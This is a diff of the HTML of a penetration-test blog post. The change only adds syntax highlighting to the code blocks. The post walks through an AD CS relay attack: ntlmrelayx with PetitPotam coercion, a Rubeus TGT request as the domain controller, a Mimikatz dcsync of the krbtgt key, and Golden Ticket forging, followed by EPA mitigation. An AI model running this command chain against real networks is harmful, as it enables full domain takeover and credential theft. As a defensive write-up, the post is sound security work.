@@ -95,30 +95,30 @@ Original research was done by <a href="https://twitter.com/harmj0y">Will Schroed
 <em>Generated certfnsh.asp</em></p>
 <p>With this, I was able to launch the ADCS Relay attack.</p>
 <p>From the attacker box, launch <code>ntlmrelayx.py</code>:</p>
-<pre tabindex="0"><code>ntlmrelayx.py -debug -smb2support --target https://ca-hostname/certsrv/certfnsh.asp --adcs --template domaincontroller
-</code></pre><p>The <code>--template</code> argument would depend on the account that would be relayed. Since I was relaying a DC, then the template should be <code>domaincontroller</code>, you could enumerate the template on the ADCS using Certify: <code>Certify.exe cas</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -debug -smb2support --target https://ca-hostname/certsrv/certfnsh.asp --adcs --template domaincontroller
+</span></span></code></pre></div><p>The <code>--template</code> argument would depend on the account that would be relayed. Since I was relaying a DC, then the template should be <code>domaincontroller</code>, you could enumerate the template on the ADCS using Certify: <code>Certify.exe cas</code></p>
 <p>On another window on the attacker box, launch <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> against the DC:</p>
-<pre tabindex="0"><code>sudo python3 petitpotam.py &lt;Attack box&#39;s IP&gt; &lt;DC&#39;s IP&gt;
-</code></pre><p>The attack was successful, on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 petitpotam.py &lt;Attack box<span style="color:#e6db74">&#39;s IP&gt; &lt;DC&#39;</span>s IP&gt;
+</span></span></code></pre></div><p>The attack was successful, on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:
 
     <img src="/images/b64cert.png"  alt="certfnsh.asp"  class="left"  style="border-radius: 8px;"  />
 
 
 <em>Base64 certificate of DC$</em></p>
 <p>From here, I proceeded with requesting for a TGT of DC$ using <code>Rubeus</code>:</p>
-<pre tabindex="0"><code>Rubeus.exe asktgt /user:DC$ /domain:&lt;domain&gt; /certificate:&lt;base64-certificate&gt; /ptt
-</code></pre><p>With the <code>/ptt</code> option, the returned TGT of DC$ would be imported into my current user session.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>DC$ /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /certificate<span style="color:#960050;background-color:#1e0010">:</span>&lt;base64-certificate&gt; /ptt
+</span></span></code></pre></div><p>With the <code>/ptt</code> option, the returned TGT of DC$ would be imported into my current user session.
 <br>
 From here, a threat actor can aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
 Launch Mimikatz and dump the AES256 encryption key:</p>
-<pre tabindex="0"><code># From mimikatz:
-lsadump::dcsync /domain:&lt;domain&gt; /user:krbtgt
-</code></pre><p>Once the AES256 encryption key of the krbtgt account has been captured, the Golden Ticket could be forged:</p>
-<pre tabindex="0"><code># From Mimikatz:
-kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID of the domain&gt; /aes256:&lt;aes256 key&gt; /ticket:goldie.kirbi
-</code></pre><p>Proceed to inject the Golden Ticket:</p>
-<pre tabindex="0"><code>Rubeus.exe ptt /ticket:goldie.kirbi
-</code></pre><p>GG!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From mimikatz:</span>
+</span></span><span style="display:flex;"><span>lsadump::dcsync /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /user<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
+</span></span></code></pre></div><p>Once the AES256 encryption key of the krbtgt account has been captured, the Golden Ticket could be forged:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From Mimikatz:</span>
+</span></span><span style="display:flex;"><span>kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /sid<span style="color:#960050;background-color:#1e0010">:</span>&lt;SID of the domain&gt; /aes256<span style="color:#960050;background-color:#1e0010">:</span>&lt;aes256 key&gt; /ticket<span style="color:#960050;background-color:#1e0010">:</span>goldie.kirbi
+</span></span></code></pre></div><p>Proceed to inject the Golden Ticket:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>goldie.kirbi
+</span></span></code></pre></div><p>GG!</p>
 <h2 id="mitigation">Mitigation</h2>
 <p>The misconfiguration has been mitigated immediately by enabling Extended Protection for Authentication (EPA) for CA Web Enrollment and Certificate Enrollment Web Service.</p>
 <p>Addition mitigations that are recommended by Microsoft are:</p>
